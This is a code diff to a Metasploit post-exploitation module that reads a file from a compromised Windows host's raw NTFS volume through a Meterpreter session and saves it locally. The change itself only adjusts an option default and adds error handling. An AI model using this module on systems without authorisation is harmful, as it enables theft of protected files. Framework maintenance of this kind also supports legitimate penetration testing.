@@ -25,7 +25,7 @@ class Metasploit3 < Msf::Post
     ))
     register_options(
       [
-        OptString.new('FILE', [true, 'The FILE to retreive from the Volume raw device', ""])
+        OptString.new('FILE', [true, 'The FILE to retreive from the Volume raw device', nil])
       ], self.class)
   end
 
@@ -55,15 +55,20 @@ class Metasploit3 < Msf::Post
     @handle = r['return']
     print_status("Successfuly opened #{drive}")
 
-    fs = Rex::Parser::NTFS.new(self)
+    begin
+      fs = Rex::Parser::NTFS.new(self)
 
-    data = fs.file(file[3, file.length - 3])
-    file_name = file.split("\\")[-1]
-    print_status("Saving file #{file_name}")
-    file_result = ::File.new(file_name, "w")
-    file_result.syswrite(data)
-    file_result.close
-    client.railgun.kernel32.CloseHandle(@handle)
+      data = fs.file(file[3, file.length - 3])
+      file_name = file.split("\\")[-1]
+      print_status("Saving file #{file_name}")
+      file_result = ::File.new(file_name, "w")
+      file_result.syswrite(data)
+      file_result.close
+    rescue ::Exception => e
+      print_error("Post failed : #{e.backtrace}")
+    ensure
+      client.railgun.kernel32.CloseHandle(@handle)
+    end
     print_status("Post Successfuly")
   end
 
